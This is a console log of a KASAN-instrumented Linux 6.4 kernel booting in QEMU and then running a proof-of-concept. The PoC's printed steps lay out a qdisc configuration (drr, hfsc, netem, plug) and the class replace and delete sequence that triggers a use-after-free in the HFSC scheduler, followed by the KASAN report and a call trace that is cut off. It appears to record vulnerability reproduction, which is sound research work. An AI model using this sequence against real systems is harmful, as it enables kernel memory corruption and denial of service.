bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004be93a8
input_len: 0x0000000001991a04
output: 0x0000000001000000
output_len: 0x00000000055054cc
kernel_total_size: 0x0000000005230000
needed_size: 0x0000000005600000
trampoline_32bit: 0x000000000009d000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.4.0-04322-gc451410ca7e3-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Sat May 16 20:21:39 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000002] kvm-clock: using sched offset of 453856048 cycles
[    0.001260] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.005452] tsc: Detected 2995.198 MHz processor
[    0.007160] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.008581] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.010620] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.017408] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.019240] Using GB pages for direct mapping
[    0.020559] Incomplete global flushes, disabling PCID
[    0.020955] RAMDISK: [mem 0x7fe8d000-0x7ffdffff]
[    0.023683] ACPI: Early table checksum verification disabled
[    0.025208] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.026713] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.028744] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.030687] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.032868] ACPI: FACS 0x000000007FFE0000 000040
[    0.034132] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.036562] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.038728] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.040977] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.042697] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.045047] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.046812] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.048454] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.050297] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.052874] No NUMA configuration found
[    0.053840] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.055574] NODE_DATA(0) allocated [mem 0x7fe89000-0x7fe8cfff]
[    0.057106] Zone ranges:
[    0.057794]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.059496]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.061262]   Normal   empty
[    0.061975] Movable zone start for each node
[    0.063024] Early memory node ranges
[    0.063863]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.065475]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.067016] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.069395] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.069455] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.084319] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.172502] kasan: KernelAddressSanitizer initialized
[    0.179773] ACPI: PM-Timer IO Port: 0x608
[    0.181491] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.183442] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.185399] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.187037] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.188673] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.190382] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.192118] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.193871] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.195552] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.197174] TSC deadline timer available
[    0.198271] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.199543] kvm-guest: KVM setup pv remote TLB flush
[    0.200822] kvm-guest: setup PV sched yield
[    0.201977] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.205050] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.207103] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.209040] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.210893] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.212395] Booting paravirtualized kernel on KVM
[    0.213631] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.226981] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.229716] percpu: Embedded 66 pages/cpu s232104 r8192 d30040 u1048576
[    0.231531] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.233807] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.236060] random: crng init done
[    0.237618] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.240316] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.242040] Fallback order for Node 0: 0 
[    0.242044] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    0.244315] Policy zone: DMA32
[    0.244900] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.246346] stackdepot: allocating hash table via alloc_large_system_hash
[    0.250333] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.270494] Memory: 1692940K/2096632K available (49152K kernel code, 7933K rwdata, 10028K rodata, 5616K init, 3052K bss, 403436K reserved, 0K cma-reserved)
[    0.273538] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.276382] Dynamic Preempt: voluntary
[    0.277907] rcu: Preemptible hierarchical RCU implementation.
[    0.279129] rcu: 	RCU event tracing is enabled.
[    0.280075] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.281426] 	Trampoline variant of Tasks RCU enabled.
[    0.282495] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.284116] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.293764] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.295342] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.304500] Console: colour VGA+ 80x25
[    0.305441] printk: console [ttyS0] enabled
[    0.305441] printk: console [ttyS0] enabled
[    0.307527] printk: bootconsole [earlyser0] disabled
[    0.307527] printk: bootconsole [earlyser0] disabled
[    0.310555] ACPI: Core revision 20230331
[    0.311776] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.313932] APIC: Switch to symmetric I/O mode setup
[    0.315078] kvm-guest: setup PV IPIs
[    0.317863] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.319377] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    0.321820] Calibrating delay loop (skipped) preset value.. 5990.39 BogoMIPS (lpj=2995198)
[    0.323346] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.324094] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.324817] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.325840] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.326827] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.327819] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.328818] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.329819] RETBleed: Mitigation: Enhanced IBRS
[    0.330822] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.331819] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.332815] MMIO Stale Data: Unknown: No mitigations
[    0.332865] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.333819] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.334819] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.335819] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.336819] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    0.356380] Freeing SMP alternatives memory: 44K
[    0.356820] pid_max: default: 32768 minimum: 301
[    0.357909] LSM: initializing lsm=capability,selinux,integrity
[    0.358845] SELinux:  Initializing.
[    0.359904] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.360822] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.363362] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    0.364046] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    0.364853] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    0.365885] signal: max sigframe size: 1776
[    0.366900] rcu: Hierarchical SRCU implementation.
[    0.367826] rcu: 	Max phase no-delay instances is 400.
[    0.369332] smp: Bringing up secondary CPUs ...
[    0.370048] smpboot: x86: Booting SMP configuration:
[    0.370828] .... node  #0, CPUs:      #1
[    0.371910] smp: Brought up 1 node, 2 CPUs
[    0.373834] smpboot: Max logical packages: 1
[    0.374831] smpboot: Total of 2 processors activated (11980.79 BogoMIPS)
[    0.378703] devtmpfs: initialized
[    0.380974] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.381936] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.383397] PM: RTC time: 20:22:51, date: 2026-05-16
[    0.384292] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.385213] audit: initializing netlink subsys (disabled)
[    0.386222] audit: type=2000 audit(1778962972.626:1): state=initialized audit_enabled=0 res=1
[    0.386872] thermal_sys: Registered thermal governor 'step_wise'
[    0.387824] thermal_sys: Registered thermal governor 'user_space'
[    0.388848] cpuidle: using governor menu
[    0.391346] PCI: Using configuration type 1 for base access
[    0.392060] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.403879] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.404824] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.409998] ACPI: Added _OSI(Module Device)
[    0.410815] ACPI: Added _OSI(Processor Device)
[    0.412827] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.414823] ACPI: Added _OSI(Processor Aggregator Device)
[    0.424159] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.473197] ACPI: Interpreter enabled
[    0.474093] ACPI: PM: (supports S0 S3 S4 S5)
[    0.474848] ACPI: Using IOAPIC for interrupt routing
[    0.476007] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.476824] PCI: Using E820 reservations for host bridge windows
[    0.478327] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.492176] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.492844] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.493823] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.494903] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.496060] PCI host bridge to bus 0000:00
[    0.496830] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.497838] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.498829] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.500020] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.500824] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.501935] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.503079] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.510115] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.517332] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.519198] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    0.520452] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.520822] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.521824] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.522826] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.524515] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.525684] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.525903] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.527609] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    0.529341] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    0.531345] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    0.535378] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    0.536231] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.542562] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    0.543827] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    0.545788] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    0.550466] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    0.558420] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.560600] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.561389] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.562776] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.563221] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.565427] iommu: Default domain type: Translated 
[    0.565852] iommu: DMA domain TLB invalidation policy: lazy mode 
[    0.567561] SCSI subsystem initialized
[    0.568006] ACPI: bus type USB registered
[    0.568815] usbcore: registered new interface driver usbfs
[    0.570856] usbcore: registered new interface driver hub
[    0.571845] usbcore: registered new device driver usb
[    0.573928] pps_core: LinuxPPS API ver. 1 registered
[    0.574844] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.580060] PTP clock support registered
[    0.582033] Advanced Linux Sound Architecture Driver Initialized.
[    0.584471] NetLabel: Initializing
[    0.584824] NetLabel:  domain hash size = 128
[    0.585822] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.586909] NetLabel:  unlabeled traffic allowed by default
[    0.588855] PCI: Using ACPI for IRQ routing
[    0.590904] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.591815] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.591815] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.596831] vgaarb: loaded
[    0.598096] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.599826] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.608236] clocksource: Switched to clocksource kvm-clock
[    0.647478] VFS: Disk quotas dquot_6.6.0
[    0.648556] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.650540] pnp: PnP ACPI init
[    0.652703] pnp: PnP ACPI: found 6 devices
[    0.668582] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.670989] NET: Registered PF_INET protocol family
[    0.672610] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.675253] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.678079] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.680420] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.683218] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.684761] TCP: Hash tables configured (established 16384 bind 16384)
[    0.687619] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.689340] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.691379] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.693384] RPC: Registered named UNIX socket transport module.
[    0.695097] RPC: Registered udp transport module.
[    0.696683] RPC: Registered tcp transport module.
[    0.698045] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.701395] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.703130] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.704846] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.706814] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.708803] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.711103] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.713334] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.716399] PCI: CLS 0 bytes, default 64
[    0.722916] Unpacking initramfs...
[    0.727131] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.730789] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    0.741023] Initialise system trusted keyrings
[    0.742412] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.745311] NFS: Registering the id_resolver key type
[    0.746627] Key type id_resolver registered
[    0.747785] Key type id_legacy registered
[    0.749098] 9p: Installing v9fs 9p2000 file system support
[    0.751390] Freeing initrd memory: 1356K
[    0.758076] Key type asymmetric registered
[    0.759761] Asymmetric key parser 'x509' registered
[    0.761944] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.763942] io scheduler mq-deadline registered
[    0.765160] io scheduler kyber registered
[    0.766785] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.769568] ACPI: button: Power Button [PWRF]
[    0.772072] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.774427] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.779207] Non-volatile memory driver v1.3
[    0.781780] Linux agpgart interface v0.103
[    0.783254] ACPI: bus type drm_connector registered
[    0.792376] loop: module loaded
[    0.796071] scsi host0: ata_piix
[    0.798435] scsi host1: ata_piix
[    0.799631] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    0.801601] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    0.804224] e100: Intel(R) PRO/100 Network Driver
[    0.805999] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.807958] e1000: Intel(R) PRO/1000 Network Driver
[    0.809628] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.958865] ata2: found unknown device (class 0)
[    0.961160] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.964165] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.986723] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.988426] cdrom: Uniform CD-ROM driver Revision: 3.20
[    1.225290] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.578788] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.580520] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.583104] e1000e: Intel(R) PRO/1000 Network Driver
[    1.584262] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.589897] sky2: driver version 1.30
[    1.593238] usbcore: registered new interface driver usblp
[    1.595596] usbcore: registered new interface driver usb-storage
[    1.597355] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.600362] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.601491] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.604040] rtc_cmos 00:05: RTC can wake from S4
[    1.606819] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.612087] rtc_cmos 00:05: registered as rtc0
[    1.613779] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.616963] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    1.619463] intel_pstate: CPU model not supported
[    1.620962] hid: raw HID events driver (C) Jiri Kosina
[    1.622511] usbcore: registered new interface driver usbhid
[    1.623878] usbhid: USB HID core driver
[    1.625637] netem: version 1.3
[    1.626458] u32 classifier
[    1.627294]     input device check on
[    1.628232]     Actions configured
[    1.630032] Initializing XFRM netlink socket
[    1.631140] NET: Registered PF_INET6 protocol family
[    1.633028] Segment Routing with IPv6
[    1.634009] In-situ OAM (IOAM) with IPv6
[    1.635016] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.639335] NET: Registered PF_PACKET protocol family
[    1.641182] 9pnet: Installing 9P2000 support
[    1.642388] Key type dns_resolver registered
[    1.644112] IPI shorthand broadcast: enabled
[    1.655304] sched_clock: Marking stable (1633007877, 21918663)->(1778772478, -123845938)
[    1.657624] registered taskstats version 1
[    1.658678] Loading compiled-in X.509 certificates
[    1.667620] PM:   Magic number: 10:142:397
[    1.668632] mem random: hash matches
[    1.669576] printk: console [netcon0] enabled
[    1.671232] netconsole: network logging started
[    1.673136] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.675425] kworker/u4:1 (51) used greatest stack depth: 29536 bytes left
[    1.677459] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.678968] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.681091] cfg80211: failed to load regulatory.db
[    1.681978] ALSA device list:
[    1.683079]   No soundcards found.
[    1.688847] Freeing unused kernel image (initmem) memory: 5616K
[    1.695309] Write protecting the kernel read-only data: 59392k
[    1.696580] Freeing unused kernel image (rodata/data gap) memory: 212K
[    1.707286] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.708346] Run /init as init process
[    1.711560] mount (55) used greatest stack depth: 28760 bytes left
[    1.716267] mount (56) used greatest stack depth: 28256 bytes left

secb: rootfs ready
---- poc begin ----
[*] drr root 1:0
[*] drr classes 1:1 1:2
[*] plug 10:0 under 1:2 (starts plugged)
[*] pre-seed plug: send priority=0x00010002
[*] u32 catch-all filter on drr root -> 1:1
[*] hfsc 2:0 under 1:1
[*] hfsc class 2:1 (RSC only) under 2:0
[*] hfsc class 2:2 (FSC only) under 2:0
[*] netem 3:0 under 2:1 (latency=100000000 ns)
[*] blackhole 4:0 under 3:0
[*] sending 1 byte priority=0x00020001 -> hfsc class 2:1 -> netem (delayed)
[*] sleeping 1500000 us so netem time_to_send becomes past
[    2.243340] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[*] RTM_NEWTCLASS replace 2:1 ADDING the FSC curve (triggers vttree dangling-insert)
[    3.236320] qdisc_peek_len: netem qdisc 3: is non-work-conserving?
[*] RTM_DELTCLASS 2:1 (kfree's hfsc_class with live vttree node)
[*] unplug 10:0
[*] send 1 byte priority=0x00020002 -> hfsc class 2:2 (init_vf -> vttree_insert -> KASAN UAF)
[    3.241170] ==================================================================
[    3.242216] BUG: KASAN: slab-use-after-free in rb_last+0x64/0x80
[    3.243128] Read of size 8 at addr ffff888009fad0c8 by task poc/61
[    3.244017] 
[    3.244271] CPU: 1 PID: 61 Comm: poc Not tainted 6.4.0-04322-gc451410ca7e3-dirty #1
[    3.246044] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    3.249931] Call Trace:
[    3.250407]  <TASK>
[    3.250854]  dump_stack_lvl+0x36/0x50
[    3.252216]  print_report+0xcf/0x660
[    3.253570]  ? rb_last+0x64/0x80
[    3.254577]  kasan_report+0xc7/0x100
[    3.255219]  ? rb_last+0x64/0x80
[    3.255766]  rb_last+0x64/0x80
[    3.256255]  init_vf.constprop.0+0x351/0xe20
[    3.256942]  hfsc_enqueue+0x7d0/0xee0
[    3.257504]  ? __pfx_hfsc_enqueue+0x10/0x10
[    3.258119]  ? __pfx_tcf_classify+0x10/0x10
[    3.258758]  drr_enqueue+0x4e3/0x9a0
[    3.259317]  ? kmem_cache_alloc_node+0x110/0x280
[    3.260021]  ? __pfx_drr_enqueue+0x10/0x10
[    3.260626]  ? _raw_spin_lock+0x80/0xe0
[    3.261216]  dev_qdisc_enqueue+0x3b/0x140
[    3.261823]  __dev_queue_xmit+0x161f/0x30c0
[    3.262464]  ? selinux_ip_postroute_compat+0x321/0x3d0
[    3.263216]  ? __pfx___dev_queue_xmit+0x10/0x10
[    3.263933]  ? arch_stack_walk+0xa7/0x100
[    3.264542]  ? selinux_ip_postroute+0x2ac/0xac0
[    3.265236]  ip_finish_output2+0x6cf/0x18f0
[    3.265920]  ? __pfx_ip_finish_output2+0x10/0x10
[    3.269015]  __ip_finish_output.part.0+0x271/0x950
[    3.270055]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    3.271136]  ? nf_hook_slow+0xa2/0x170
[    3.271958]  ip_output+0x2c7/0x650
[    3.272771]  ? __pfx_ip_output+0x10/0x10
[    3.273590]  ? __pfx_ip_finish_output+0x10/0x10
[    3.275292]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    3.276157]  ? __pfx_ip_make_skb+0x10/0x10
[    3.276834]  ip_send_skb+0x113/0x150
[    3.277387]  udp_send_skb+0x57d/0x1260
[    3.277965]  udp_sendmsg+0x1757/0x2230
[    3.278519]  ? avc_has_perm_noaudit+0x8a/0x130
[    3.279198]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    3.279841]  ? __pfx_udp_sendmsg+0x10/0x10
[    3.280466]  ? udp_lib_get_port+0x4b9/0x1850
[    3.281133]  ? ip4_datagram_release_cb+0x161/0x7f0
[    3.281846]  ? __pfx_ip4_datagram_release_cb+0x10/0x10
[    3.282639]  ? __pfx_sk_setsockopt+0x10/0x10
[    3.283278]  ? inet_autobind+0x108/0x160
[    3.283840]  ? inet_send_prepare+0x21f/0x2a0
[    3.284453]  ? __pfx_inet_sendmsg+0x10/0x10
[    3.285099]  ? sock_sendmsg+0x138/0x180
[    3.285842]  sock_sendmsg+0x138/0x180
[    3.286563]  __sys_sendto+0x1eb/0x2b0
[    3.287216]  ? __pfx___sys_sendto+0x10/0x10
[    3.287875]  ? __pfx_udp_push_pending_frames+0x10/0x10
[    3.288966]  ? udp_lib_setsockopt+0x52f/0xc00
[    3.290084]  ? __pfx_udp_lib_setsockopt+0x10/0x10
[    3.291057]  ? __pfx___sys_socket+0x10/0x10
